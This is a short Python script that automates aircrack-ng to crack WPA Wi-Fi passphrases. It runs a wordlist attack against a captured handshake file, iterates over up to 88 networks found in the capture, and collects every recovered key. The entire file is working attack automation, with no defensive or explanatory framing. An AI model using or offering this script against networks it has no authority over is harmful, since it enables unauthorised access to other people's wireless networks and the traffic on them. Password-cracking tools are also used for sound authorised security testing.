import re
from subprocess import Popen, PIPE, STDOUT
ssidlist = []

def GetSSID(firsttime,ssid):
    global ssidlist
    if firsttime == True:
        buflist = []
        p = Popen(['aircrack-ng', 'wpa.cap', '-w','wordlist.txt'], stdout=PIPE, stdin=PIPE, stderr=STDOUT)  
        firstoutput = p.communicate()[0]
        for line in firstoutput.decode().splitlines():
            buflist.append(list(filter(None,[s.replace(' ', '') for s in line.split("  ")])))
        for item in buflist:
            if  (len(item)) == 4:
                ssidlist.append(item)
        
    else:
        for item in ssidlist:
            if item[0] == str(ssid):
                return item[2]    

outputarr = []
GetSSID(True,"")
print(GetSSID(False,1))

for i in range (1,89):
    byteinput = str.encode(str(i))
    print("Working with ["+str(i)+"] "+GetSSID(False,i)+".. ")
    p = Popen(['aircrack-ng', 'wpa.cap', '-w','wordlist.txt'], stdout=PIPE, stdin=PIPE, stderr=STDOUT)  
    grep_stdout = p.communicate(input=byteinput)[0]
    outputlines = grep_stdout.decode()
    for line in outputlines.splitlines():
        if "KEY FOUND!" in line:
            s = line[line.find('KEY FOUND!'):]
            outputarr.append(s[s.find("[")+len("["):s.rfind("]")])
            print("RESULT: +")
        if ("KEY NOT FOUND") in line:
            print("RESULT: -")
            

print(outputarr)